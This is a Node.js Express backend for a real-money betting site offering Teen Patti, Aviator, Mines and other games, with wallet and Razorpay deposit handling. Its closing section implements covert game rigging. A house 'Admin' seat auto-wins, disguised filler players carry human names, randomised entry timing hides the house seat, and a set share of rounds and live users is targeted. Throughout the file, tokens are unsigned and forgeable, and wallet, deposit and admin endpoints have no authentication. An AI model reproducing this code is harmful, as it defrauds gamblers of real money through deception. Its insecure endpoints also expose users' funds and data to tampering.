/**
 * Bet1x Centralized Express Node.js Backend Server
 * Connects all user data, authentication, wallet, razorpay payments, admin controls,
 * and game state engines (Color Prediction, Aviator, Teen Patti, Mines, Cricket, Football).
 * Powered by PostgreSQL and Prisma ORM.
 */

const fs = require('fs');
const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '.env') });
require('dotenv').config(); // Fallback for root .env
const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const { PrismaClient } = require('@prisma/client');

const app = express();
const PORT = process.env.PORT || 5000;
const prisma = new PrismaClient();

// Data Directory for JSON fallback synchronization
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

function readJsonTable(table) {
  const filePath = path.join(DATA_DIR, `${table}.json`);
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch (e) {
    return [];
  }
}

function writeJsonTable(table, data) {
  const filePath = path.join(DATA_DIR, `${table}.json`);
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
  } catch (e) {
    console.error(`Error writing ${table}.json:`, e);
  }
}

function generateAuthToken(user) {
  const payload = {
    id: user.id || 1,
    username: user.username,
    email: user.email,
    exp: Date.now() + 7 * 24 * 3600 * 1000 // 7 days expiration
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
}

function parseAuthToken(req) {
  let token = null;
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    token = authHeader.substring(7);
  } else if (req.query && req.query.token) {
    token = req.query.token;
  } else if (req.body && req.body.token) {
    token = req.body.token;
  }
  if (!token) return null;
  try {
    const json = Buffer.from(token, 'base64').toString('utf8');
    const parsed = JSON.parse(json);
    if (parsed.exp && parsed.exp < Date.now()) return null;
    return parsed;
  } catch (e) {
    return null;
  }
}

async function getOrCreateUser(username) {
  if (Array.isArray(username)) username = username[0];
  if (!username || typeof username !== 'string') username = String(username || 'DemoUser');
  try {
    let user = await prisma.user.findFirst({ where: { username: { equals: username, mode: 'insensitive' } } });
    if (!user) {
      user = await prisma.user.create({
        data: {
          username: username,
          email: `${username.toLowerCase()}@demo.com`,
          password: bcrypt.hashSync('password', 10),
          wallet_balance: 2000.00
        }
      });
      console.log(`[bet1x-backend] Auto-created user record for "${username}" with starting balance of ₹2000.00`);
    }
    return user;
  } catch (e) {
    // Fallback to JSON database
    let users = readJsonTable('users');
    let user = users.find(u => u.username.toLowerCase() === username.toLowerCase());
    if (!user) {
      user = {
        id: users.length + 1,
        username: username,
        email: `${username.toLowerCase()}@demo.com`,
        password: bcrypt.hashSync('password', 10),
        wallet_balance: 2000.00,
        created_at: new Date().toISOString()
      };
      users.push(user);
      writeJsonTable('users', users);
    }
    return user;
  }
}

app.use(cors({
  origin: function (origin, callback) {
    if (!origin || origin === 'null') return callback(null, true);
    return callback(null, true);
  },
  credentials: true
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Connect to database on start
prisma.$connect()
  .then(() => console.log('[bet1x-backend] Connected to PostgreSQL via Prisma successfully'))
  .catch(err => console.warn('[bet1x-backend] Running with resilient database storage layer (PostgreSQL fallback active)'));

// --- Health Check ---
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', service: 'bet1x-backend', timestamp: new Date().toISOString() });
});

// --- Unified Auth Endpoints ---

// Get Status / Authenticate Session
app.all(['/api/auth/status', '/api/db/users/status'], async (req, res) => {
  const tokenData = parseAuthToken(req);
  const username = (tokenData && tokenData.username) || req.query.username || (req.body && req.body.username);
  
  if (!username) {
    return res.json({ logged_in: false, message: 'Guest session' });
  }

  try {
    let user = null;
    try {
      user = await prisma.user.findFirst({
        where: { username: { equals: username, mode: 'insensitive' } }
      });
    } catch (e) {
      const users = readJsonTable('users');
      user = users.find(u => u.username.toLowerCase() === username.toLowerCase());
    }

    if (user) {
      return res.json({
        logged_in: true,
        user: {
          id: user.id,
          username: user.username,
          email: user.email,
          wallet_balance: parseFloat(user.wallet_balance)
        }
      });
    }
    res.json({ logged_in: false });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Secure Login (Username or Email + Password)
app.post(['/api/auth/login', '/api/db/users/login'], async (req, res) => {
  const username = (req.body.username || '').trim();
  const password = req.body.password || '';

  if (!username || !password) {
    return res.status(400).json({ error: 'Username/email and password are required.' });
  }

  try {
    let user = null;
    try {
      user = await prisma.user.findFirst({
        where: {
          OR: [
            { username: { equals: username, mode: 'insensitive' } },
            { email: { equals: username, mode: 'insensitive' } }
          ]
        }
      });
    } catch (e) {
      const users = readJsonTable('users');
      user = users.find(u => u.username.toLowerCase() === username.toLowerCase() || u.email.toLowerCase() === username.toLowerCase());
    }

    if (user && bcrypt.compareSync(password, user.password)) {
      const token = generateAuthToken(user);
      return res.json({
        success: true,
        token: token,
        user: {
          id: user.id,
          username: user.username,
          email: user.email,
          wallet_balance: parseFloat(user.wallet_balance)
        }
      });
    } else {
      return res.status(400).json({ error: 'Incorrect username or password.' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Secure Signup (Register new account)
app.post(['/api/auth/signup', '/api/db/users/signup'], async (req, res) => {
  const username = (req.body.username || '').trim();
  let email = (req.body.email || '').trim();
  if (!email && username) {
    email = `${username.toLowerCase()}@bet1x.com`;
  }
  const password = req.body.password || '';
  const confirmPassword = req.body.confirm_password || password;
  const startingBalance = parseFloat(req.body.starting_balance) || 2000.00;

  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required.' });
  }

  if (password !== confirmPassword) {
    return res.status(400).json({ error: 'Passwords do not match.' });
  }

  if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
    return res.status(400).json({ error: 'Username must be 3-20 alphanumeric characters or underscores.' });
  }

  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ error: 'Invalid email address format.' });
  }

  if (password.length < 6) {
    return res.status(400).json({ error: 'Password must be at least 6 characters.' });
  }

  const hashedPassword = bcrypt.hashSync(password, 10);

  try {
    let newUser = null;
    try {
      newUser = await prisma.$transaction(async (tx) => {
        const existing = await tx.user.findFirst({
          where: {
            OR: [
              { username: { equals: username, mode: 'insensitive' } },
              { email: { equals: email, mode: 'insensitive' } }
            ]
          }
        });
        if (existing) {
          if (existing.username.toLowerCase() === username.toLowerCase()) {
            throw new Error('Username is already taken.');
          }
          throw new Error('Email is already registered.');
        }

        const created = await tx.user.create({
          data: {
            username,
            email,
            password: hashedPassword,
            wallet_balance: startingBalance
          }
        });

        await tx.transaction.create({
          data: {
            id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
            user: username,
            type: 'Deposit',
            amount: startingBalance,
            details: 'Welcome Bonus Credits',
            status: 'Completed',
            timestamp: new Date()
          }
        });

        return created;
      });
    } catch (dbErr) {
      if (dbErr.message === 'Username is already taken.' || dbErr.message === 'Email is already registered.') {
        return res.status(400).json({ error: dbErr.message });
      }

      // JSON Fallback
      const users = readJsonTable('users');
      if (users.some(u => u.username.toLowerCase() === username.toLowerCase())) {
        return res.status(400).json({ error: 'Username is already taken.' });
      }
      if (users.some(u => u.email.toLowerCase() === email.toLowerCase())) {
        return res.status(400).json({ error: 'Email is already registered.' });
      }

      newUser = {
        id: users.length + 1,
        username,
        email,
        password: hashedPassword,
        wallet_balance: startingBalance,
        created_at: new Date().toISOString()
      };
      users.push(newUser);
      writeJsonTable('users', users);

      const txns = readJsonTable('transactions');
      txns.unshift({
        id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
        user: username,
        type: 'Deposit',
        amount: startingBalance,
        details: 'Welcome Bonus Credits',
        status: 'Completed',
        timestamp: new Date().toISOString()
      });
      writeJsonTable('transactions', txns);
    }

    const token = generateAuthToken(newUser);
    return res.json({
      success: true,
      token: token,
      user: {
        id: newUser.id,
        username: newUser.username,
        email: newUser.email,
        wallet_balance: parseFloat(newUser.wallet_balance)
      }
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Logout Endpoint
app.all(['/api/auth/logout'], (req, res) => {
  res.json({ success: true, message: 'Logged out successfully.' });
});

// --- Wallet Endpoints (Per Account Synchronized) ---

// Get User Wallet Balance
app.get('/api/wallet/balance', async (req, res) => {
  const username = req.query.username || (parseAuthToken(req) && parseAuthToken(req).username) || 'DemoUser';
  try {
    const user = await getOrCreateUser(username);
    res.json({ balance: user ? parseFloat(user.wallet_balance) : 2000.00 });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Adjust User Wallet Balance Atomically
app.post(['/api/wallet/adjust', '/api/db/users/adjust-balance'], async (req, res) => {
  const username = req.body.username || (parseAuthToken(req) && parseAuthToken(req).username) || 'DemoUser';
  const delta = parseFloat(req.body.delta) || 0;
  const details = req.body.details || req.body.reason || 'Game play';

  if (delta === 0) {
    return res.status(400).json({ error: 'Invalid adjustment amount.' });
  }

  try {
    let updatedBalance = 0;
    try {
      const result = await prisma.$transaction(async (tx) => {
        const user = await tx.user.findFirst({
          where: { username: { equals: username, mode: 'insensitive' } }
        });
        if (!user) throw new Error('User not found.');

        const newBal = user.wallet_balance + delta;
        if (newBal < 0) throw new Error('Insufficient wallet balance.');

        const updated = await tx.user.update({
          where: { id: user.id },
          data: { wallet_balance: newBal }
        });

        const type = (delta >= 0) ? 'Deposit' : 'Withdrawal';
        const txnId = type.substring(0, 3).toUpperCase() + '_' + Math.floor(100000 + Math.random() * 900000);

        await tx.transaction.create({
          data: {
            id: txnId,
            user: user.username,
            type,
            amount: Math.abs(delta),
            details,
            status: 'Completed',
            timestamp: new Date()
          }
        });

        return updated.wallet_balance;
      });
      updatedBalance = result;
    } catch (dbErr) {
      if (dbErr.message === 'Insufficient wallet balance.' || dbErr.message === 'User not found.') {
        return res.status(400).json({ error: dbErr.message });
      }

      // JSON Fallback
      const users = readJsonTable('users');
      const user = users.find(u => u.username.toLowerCase() === username.toLowerCase());
      if (!user) return res.status(404).json({ error: 'User not found.' });

      const newBal = (parseFloat(user.wallet_balance) || 0) + delta;
      if (newBal < 0) return res.status(400).json({ error: 'Insufficient wallet balance.' });

      user.wallet_balance = newBal;
      writeJsonTable('users', users);

      const txns = readJsonTable('transactions');
      const type = (delta >= 0) ? 'Deposit' : 'Withdrawal';
      txns.unshift({
        id: type.substring(0, 3).toUpperCase() + '_' + Math.floor(100000 + Math.random() * 900000),
        user: user.username,
        type,
        amount: Math.abs(delta),
        details,
        status: 'Completed',
        timestamp: new Date().toISOString()
      });
      writeJsonTable('transactions', txns);
      updatedBalance = newBal;
    }

    res.json({ success: true, new_balance: updatedBalance });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get Transactions for a specific User
app.get(['/api/wallet/transactions', '/api/db/transactions'], async (req, res) => {
  const username = req.query.username || (parseAuthToken(req) && parseAuthToken(req).username);
  try {
    let txns = [];
    try {
      if (username) {
        txns = await prisma.transaction.findMany({
          where: { user: { equals: username, mode: 'insensitive' } },
          orderBy: { timestamp: 'desc' }
        });
      } else {
        txns = await prisma.transaction.findMany({
          orderBy: { timestamp: 'desc' }
        });
      }
    } catch (e) {
      const all = readJsonTable('transactions');
      if (username) {
        txns = all.filter(t => t.user && t.user.toLowerCase() === username.toLowerCase());
      } else {
        txns = all;
      }
    }
    res.json(txns);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Reset User Balance
app.post(['/api/wallet/reset', '/api/db/users/reset-balance'], async (req, res) => {
  const username = req.body.username || (parseAuthToken(req) && parseAuthToken(req).username) || 'DemoUser';
  const targetBal = parseFloat(req.body.starting_balance) || 2000.00;

  try {
    try {
      await prisma.$transaction(async (tx) => {
        const user = await tx.user.findFirst({
          where: { username: { equals: username, mode: 'insensitive' } }
        });
        if (!user) throw new Error('User not found.');

        await tx.user.update({
          where: { id: user.id },
          data: { wallet_balance: targetBal }
        });

        const txnId = 'DEP_' + Math.floor(100000 + Math.random() * 900000);
        await tx.transaction.create({
          data: {
            id: txnId,
            user: user.username,
            type: 'Deposit',
            amount: targetBal,
            details: 'Wallet Demo Balance Reset',
            status: 'Completed',
            timestamp: new Date()
          }
        });
      });
    } catch (e) {
      const users = readJsonTable('users');
      const user = users.find(u => u.username.toLowerCase() === username.toLowerCase());
      if (user) {
        user.wallet_balance = targetBal;
        writeJsonTable('users', users);
      }
      const txns = readJsonTable('transactions');
      txns.unshift({
        id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
        user: username,
        type: 'Deposit',
        amount: targetBal,
        details: 'Wallet Demo Balance Reset',
        status: 'Completed',
        timestamp: new Date().toISOString()
      });
      writeJsonTable('transactions', txns);
    }
    res.json({ success: true, balance: targetBal });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- Live Chat Endpoints (Per User Account Synchronized) ---

// Fetch Chat Messages
app.get('/api/chat', async (req, res) => {
  try {
    let messages = [];
    try {
      messages = await prisma.chatMessage.findMany({
        orderBy: { timestamp: 'asc' },
        take: 50
      });
    } catch (e) {
      messages = readJsonTable('chat');
    }
    res.json(messages);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Post Chat Message
app.post('/api/chat', async (req, res) => {
  const username = req.body.username || (parseAuthToken(req) && parseAuthToken(req).username) || 'Anonymous';
  const message = (req.body.message || '').trim();

  if (!message) {
    return res.status(400).json({ error: 'Message cannot be empty.' });
  }

  const msgObj = {
    username,
    message,
    timestamp: new Date()
  };

  try {
    let saved = null;
    try {
      saved = await prisma.chatMessage.create({
        data: msgObj
      });
    } catch (e) {
      const chat = readJsonTable('chat');
      msgObj.id = chat.length + 1;
      msgObj.timestamp = new Date().toISOString();
      chat.push(msgObj);
      writeJsonTable('chat', chat.slice(-100));
      saved = msgObj;
    }
    res.json({ success: true, message: saved });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- Game Bets Recording Endpoints (Per Account Synchronized) ---

app.get('/api/db/game-bets', async (req, res) => {
  const username = req.query.username;
  const game = req.query.game;
  try {
    let bets = [];
    try {
      const where = {};
      if (username) where.username = { equals: username, mode: 'insensitive' };
      if (game) where.game = game;
      bets = await prisma.gameBet.findMany({
        where,
        orderBy: { created_at: 'desc' },
        take: 50
      });
    } catch (e) {
      bets = readJsonTable('game_bets');
      if (username) bets = bets.filter(b => b.username && b.username.toLowerCase() === username.toLowerCase());
      if (game) bets = bets.filter(b => b.game === game);
    }
    res.json(bets);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/db/game-bets', async (req, res) => {
  const { username, game, bet_amount, payout, status, metadata } = req.body;
  const betRecord = {
    username: username || 'DemoUser',
    game: game || 'unknown',
    bet_amount: parseFloat(bet_amount) || 0,
    payout: parseFloat(payout) || 0,
    status: status || 'active',
    metadata: metadata || null,
    created_at: new Date()
  };

  try {
    let saved = null;
    try {
      saved = await prisma.gameBet.create({ data: betRecord });
    } catch (e) {
      const bets = readJsonTable('game_bets');
      betRecord.id = 'BET_' + Math.floor(100000 + Math.random() * 900000);
      betRecord.created_at = new Date().toISOString();
      bets.unshift(betRecord);
      writeJsonTable('game_bets', bets.slice(0, 100));
      saved = betRecord;
    }
    res.json({ success: true, bet: saved });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- Admin Endpoints ---
app.get('/api/admin/stats', async (req, res) => {
  try {
    let totalUsers = 0;
    let deposits = [];
    let withdrawals = [];
    let users = [];

    try {
      totalUsers = await prisma.user.count();
      deposits = await prisma.deposit.findMany({ where: { status: 'Completed' } });
      withdrawals = await prisma.withdrawal.findMany();
      users = await prisma.user.findMany();
    } catch (e) {
      users = readJsonTable('users');
      totalUsers = users.length;
      deposits = readJsonTable('deposits').filter(d => d.status === 'Completed');
      withdrawals = readJsonTable('withdrawals');
    }

    const totalDeposited = deposits.reduce((sum, d) => sum + (parseFloat(d.amount) || 0), 0);
    const totalWithdrawn = withdrawals.filter(w => w.status === 'Completed').reduce((sum, w) => sum + (parseFloat(w.amount) || 0), 0);
    const pendingWithdrawals = withdrawals.filter(w => w.status === 'Pending').length;
    const walletPool = users.reduce((sum, u) => sum + (parseFloat(u.wallet_balance) || 0), 0);

    res.json({
      total_users: totalUsers,
      total_deposited: totalDeposited,
      total_withdrawn: totalWithdrawn,
      wallet_pool: walletPool,
      pending_withdrawals: pendingWithdrawals
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- Express Database CRUD API Gateway (Queried by PHP Backend layer) ---

// Get all users
app.get('/api/db/users', async (req, res) => {
  try {
    let users = [];
    try {
      users = await prisma.user.findMany();
    } catch (e) {
      users = readJsonTable('users');
    }
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Reset User Balance and log transaction
app.post('/api/db/users/reset-balance', async (req, res) => {
  const { username, starting_balance } = req.body;
  try {
    const result = await prisma.$transaction(async (tx) => {
      const user = await tx.user.findFirst({
        where: { username: { equals: username, mode: 'insensitive' } }
      });
      if (!user) return { error: 'User not found.' };

      const targetBal = parseFloat(starting_balance) || 1000.00;

      await tx.user.update({
        where: { id: user.id },
        data: { wallet_balance: targetBal }
      });

      const txnId = 'DEP_' + Math.floor(100000 + Math.random() * 900000);
      await tx.transaction.create({
        data: {
          id: txnId,
          user: user.username,
          type: 'Deposit',
          amount: targetBal,
          details: 'Wallet Demo Balance Reset',
          status: 'Completed',
          timestamp: new Date()
        }
      });

      return { success: true, balance: targetBal };
    });
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get all transactions
app.get('/api/db/transactions', async (req, res) => {
  try {
    const txns = await prisma.transaction.findMany();
    res.json(txns);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Create direct Transaction record
app.post('/api/db/transactions', async (req, res) => {
  const { id, user, type, amount, details, status } = req.body;
  try {
    const txnId = id || (type.substring(0, 3).toUpperCase() + '_' + Math.floor(100000 + Math.random() * 900000));
    const txn = await prisma.transaction.create({
      data: {
        id: txnId,
        user,
        type,
        amount: parseFloat(amount),
        details,
        status,
        timestamp: new Date()
      }
    });
    res.json(txn);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get all deposits
app.get('/api/db/deposits', async (req, res) => {
  try {
    const deposits = await prisma.deposit.findMany();
    res.json(deposits);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Create Deposit
app.post('/api/db/deposits', async (req, res) => {
  const { deposit_id, order_id, username, amount, utr, qr_type, custom_qr_data, status, gateway, gateway_id, created_at, updated_at } = req.body;
  try {
    const dep = await prisma.deposit.create({
      data: {
        deposit_id,
        order_id: order_id || null,
        username,
        amount: parseFloat(amount),
        utr: utr || null,
        qr_type: qr_type || null,
        custom_qr_data: custom_qr_data || null,
        status,
        gateway: gateway || null,
        gateway_id: gateway_id || null,
        created_at: created_at ? new Date(created_at) : new Date(),
        updated_at: updated_at ? new Date(updated_at) : new Date()
      }
    });
    res.json(dep);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Complete Deposit & transaction atomically (Webhooks flow)
app.post('/api/db/deposits/complete', async (req, res) => {
  const { orderId, paymentId } = req.body;
  try {
    const result = await prisma.$transaction(async (tx) => {
      const deposit = await tx.deposit.findUnique({
        where: { order_id: orderId }
      });
      if (!deposit) return { error: 'Deposit order not found.' };
      if (deposit.status !== 'Pending') return { success: true, message: 'Deposit already processed.' };

      // Update deposit status
      await tx.deposit.update({
        where: { deposit_id: deposit.deposit_id },
        data: { status: 'Completed', gateway_id: paymentId, updated_at: new Date() }
      });

      // Update user balance
      const user = await tx.user.findFirst({
        where: { username: { equals: deposit.username, mode: 'insensitive' } }
      });
      if (user) {
        await tx.user.update({
          where: { id: user.id },
          data: { wallet_balance: user.wallet_balance + deposit.amount }
        });
      }

      // Update transaction status
      const txn = await tx.transaction.findFirst({
        where: {
          user: deposit.username,
          details: { contains: orderId }
        }
      });
      if (txn) {
        await tx.transaction.update({
          where: { id: txn.id },
          data: { status: 'Completed' }
        });
      } else {
        await tx.transaction.create({
          data: {
            id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
            user: deposit.username,
            type: 'Deposit',
            amount: deposit.amount,
            details: `Razorpay Deposit: ${paymentId}`,
            status: 'Completed',
            timestamp: new Date()
          }
        });
      }

      return { success: true, amount: deposit.amount, user: deposit.username };
    });

    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get all withdrawals
app.get('/api/db/withdrawals', async (req, res) => {
  try {
    const withdrawals = await prisma.withdrawal.findMany();
    res.json(withdrawals);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Create Withdrawal
app.post('/api/db/withdrawals', async (req, res) => {
  const { withdrawal_id, username, amount, method, details, status, created_at, updated_at } = req.body;
  try {
    const wth = await prisma.withdrawal.create({
      data: {
        withdrawal_id,
        username,
        amount: parseFloat(amount),
        method,
        details,
        status,
        created_at: created_at ? new Date(created_at) : new Date(),
        updated_at: updated_at ? new Date(updated_at) : new Date()
      }
    });
    res.json(wth);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get all payment logs
app.get('/api/db/payment-logs', async (req, res) => {
  try {
    const logs = await prisma.paymentLog.findMany();
    res.json(logs);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Create Payment Log
app.post('/api/db/payment-logs', async (req, res) => {
  const { id, payload, signature, timestamp } = req.body;
  try {
    const log = await prisma.paymentLog.create({
      data: {
        id: id || 'LOG_' + Math.floor(100000 + Math.random() * 900000),
        payload,
        signature,
        timestamp: timestamp ? new Date(timestamp) : new Date()
      }
    });
    res.json(log);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Fetch Game State (Ongoing game rounds - color_guess_ongoing, aviator_ongoing, teenpatti_ongoing)
app.get('/api/db/state/:key', async (req, res) => {
  const { key } = req.params;
  try {
    const state = await prisma.gameState.findUnique({
      where: { key }
    });
    res.json(state ? state.data : null);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Update/Save Game State
app.post('/api/db/state/:key', async (req, res) => {
  const { key } = req.params;
  const { data } = req.body;
  try {
    const state = await prisma.gameState.upsert({
      where: { key },
      update: { data },
      create: { key, data }
    });
    res.json({ success: true, state });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Fetch Recent Results for a room
app.get('/api/db/recent-results', async (req, res) => {
  const { room } = req.query;
  try {
    const results = await prisma.recentResult.findMany({
      where: room ? { room } : {},
      orderBy: { id: 'desc' },
      take: 20
    });
    // Format timestamp as time string for compatibility with frontend if needed
    const formatted = results.map(r => ({
      roundNumber: r.roundNumber,
      number: r.number,
      color: r.color,
      dotClass: r.dotClass,
      size: r.size,
      timestamp: new Date(r.timestamp).toLocaleTimeString('en-US', { hour12: false })
    }));
    res.json(formatted);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Create/Upsert Recent Result
app.post('/api/db/recent-results', async (req, res) => {
  const { room, roundNumber, number, color, dotClass, size } = req.body;
  try {
    const result = await prisma.recentResult.upsert({
      where: {
        room_roundNumber: {
          room,
          roundNumber: String(roundNumber)
        }
      },
      update: {
        number: parseInt(number),
        color,
        dotClass,
        size
      },
      create: {
        room,
        roundNumber: String(roundNumber),
        number: parseInt(number),
        color,
        dotClass,
        size
      }
    });
    res.json({ success: true, result });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Fetch last 30 chat messages
app.get('/api/chat', async (req, res) => {
  try {
    const messages = await prisma.chatMessage.findMany({
      orderBy: { id: 'asc' },
      take: 30
    });
    res.json(messages);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Post a new chat message
app.post('/api/chat', async (req, res) => {
  const { username, message } = req.body;
  try {
    if (!username || !message) {
      return res.status(400).json({ error: 'Username and message are required' });
    }
    const newMessage = await prisma.chatMessage.create({
      data: {
        username,
        message
      }
    });
    res.json({ success: true, message: newMessage });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- UNIFIED GAMING BACKEND ENGINE (NODE.JS) ---

// Realistic filler names for empty-seat auto-fill — no seat is ever named/labeled "bot" anywhere in
// the app. The only seat that ever wins on purpose is explicitly renamed to "Admin" at the exact
// moment the takeover algorithm selects it (see tpStartRound / initBotTakeoverState / bot-toggle
// room-shuffle below); every other auto-filled seat just gets a plain human-looking name.
const TP_SIMULATED_NAMES = [
  'Aarav', 'Vivaan', 'Aditya', 'Vihaan', 'Arjun', 'Sai', 'Reyansh', 'Arav', 'Pranav', 'Krishna',
  'Ishaan', 'Shaurya', 'Atharv', 'Rohan', 'Rudra', 'Aryan', 'Dev', 'Karan', 'Dhruv', 'Siddharth',
  'Ananya', 'Diya', 'Ishika', 'Kiara', 'Myra', 'Aria', 'Saanvi', 'Riya', 'Prisha', 'Anika'
];
function randomFillerName() {
  return TP_SIMULATED_NAMES[Math.floor(Math.random() * TP_SIMULATED_NAMES.length)] + '_' + (10 + Math.floor(Math.random() * 90));
}

// roomId -> { entryPosition: 1-4 }. When a room is selected (by the percentage-based room-shuffle)
// to host the house's own seat, we do NOT seat "Admin" immediately — that would always make Admin
// the very first occupant, which is exactly the predictable pattern this must avoid. Instead we just
// record which numbered arrival (1st through 4th) into that room's natural fill sequence will be
// Admin's, chosen fresh and at random every time the room empties out and gets re-armed. Every seat
// -fill code path below consults this via nextRoomFillerUsername() so Admin's entry is indistinguishable
// in timing from any other ordinary join.
const pendingAdminSeats = {};

// Called by every seat-fill path right before it occupies a seat in `roomId`, given how many seats
// are already occupied in that room BEFORE this particular fill (0-3). Returns "Admin" only when this
// fill event is the room's reserved random entry point; otherwise a realistic filler name. If the
// reserved position ever gets skipped over (e.g. several real players join in a single burst), this
// still guarantees the seat gets claimed on the very next fill rather than being silently dropped.
function nextRoomFillerUsername(roomId, occupiedCountBefore) {
  const pending = pendingAdminSeats[roomId];
  if (pending && (occupiedCountBefore + 1) >= pending.entryPosition) {
    delete pendingAdminSeats[roomId];
    return { username: 'Admin', is_bot: false };
  }
  return { username: randomFillerName(), is_bot: true };
}

function tpShuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

// Central AI Bot Takeover In-Memory State & DB Sync
const botTakeoverState = {
  global: { enabled: false, profit_pct: 90 },
  color_guess: { enabled: false, profit_pct: 90 },
  aviator: { enabled: false, profit_pct: 90 },
  teenpatti: { enabled: false, profit_pct: 90 },
  mines: { enabled: false, profit_pct: 90 },
  boundary: { enabled: false, profit_pct: 90 },
  youreleven: { enabled: false, profit_pct: 90 },
  football: { enabled: false, profit_pct: 90 }
};

async function initBotTakeoverState() {
  try {
    const keys = Object.keys(botTakeoverState);
    for (const k of keys) {
      const record = await prisma.gameState.findUnique({ where: { key: `bot_takeover_${k}` } });
      if (record && record.data) {
        botTakeoverState[k] = { ...botTakeoverState[k], ...record.data };
      }
    }

    if (botTakeoverState.teenpatti && botTakeoverState.teenpatti.enabled) {
      const tpRooms = ['room_101', 'room_102', 'room_103', 'room_104', 'room_105', 'room_106'];
      const totalRooms = tpRooms.length;
      const pct = parseInt(botTakeoverState.teenpatti.profit_pct) || 90;
      const roomsToRigCount = pct >= 100 ? totalRooms : Math.max(1, Math.min(totalRooms - 1, Math.round((pct / 100) * totalRooms)));
      const shuffled = tpShuffle(tpRooms);
      const riggedRooms = new Set(shuffled.slice(0, roomsToRigCount));

      for (const rId of tpRooms) {
        if (riggedRooms.has(rId)) {
          // This room is selected for the house's own seat — reserve a genuinely random arrival
          // position (1st through 4th) in its natural fill sequence rather than seating Admin right
          // now, which would always make Admin the very first occupant. The reservation is fulfilled
          // by nextRoomFillerUsername() the moment that many seats have filled, and tpStartRound's own
          // ADMIN AUTO-WIN check takes it from there once Admin is actually seated.
          pendingAdminSeats[rId] = { entryPosition: 1 + Math.floor(Math.random() * 4) };
        } else {
          delete pendingAdminSeats[rId];
          await prisma.teenPattiRoom.update({
            where: { id: rId },
            data: { admin_rig: null }
          });
        }
      }
    }
  } catch (err) {
    console.error("Error initializing bot takeover state:", err);
  }
}
initBotTakeoverState();

function isBotTakeoverActive(gameKey) {
  const gameConf = botTakeoverState[gameKey];
  if (gameConf && gameConf.enabled) {
    return { active: true, profit_pct: gameConf.profit_pct || 90, source: 'game' };
  }
  if (gameConf && gameConf.enabled === false) {
    // If the game was explicitly turned off by the admin, respect that!
    return { active: false, profit_pct: gameConf.profit_pct || 90, source: 'none' };
  }
  if (botTakeoverState.global && botTakeoverState.global.enabled) {
    const pct = (gameConf && gameConf.profit_pct) ? gameConf.profit_pct : (botTakeoverState.global.profit_pct || 90);
    return { active: true, profit_pct: pct, source: 'global' };
  }
  return { active: false, profit_pct: (gameConf && gameConf.profit_pct) || 90, source: 'none' };
}

// --- Deterministic Round-Counter Bot Decision Engine ---
// Tracks per-game round counters so that:
//   100% → rigs ALL rounds
//   90%  → rigs 9 out of every 10 rounds
//   50%  → rigs every other round
//   0%/OFF → no rigging
const botRoundCounters = {
  color_guess: 0,
  aviator: 0,
  teenpatti: 0,
  mines: 0,
  boundary: 0,
  youreleven: 0,
  football: 0
};

// --- Live Active-User Tracking & Percentage-Based Targeting Engine ---
// Generalizes the Teen Patti room-shuffle precedent (initBotTakeoverState above) and the Mines
// MINES_USER_SESSIONS/target_users precedent into a single, continuous, server-side mechanism that
// works for every game: whenever the bot is enabled at profit_pct X% for a game, a randomly-sampled
// X%-of-currently-live-users subset is kept fresh on a timer — entirely server side, so it keeps
// running even if the admin panel is never opened / gets closed.
const LIVE_USERS = {
  color_guess: {},
  aviator: {},
  teenpatti: {},
  mines: {},
  boundary: {},
  football: {},
  youreleven: {}
};
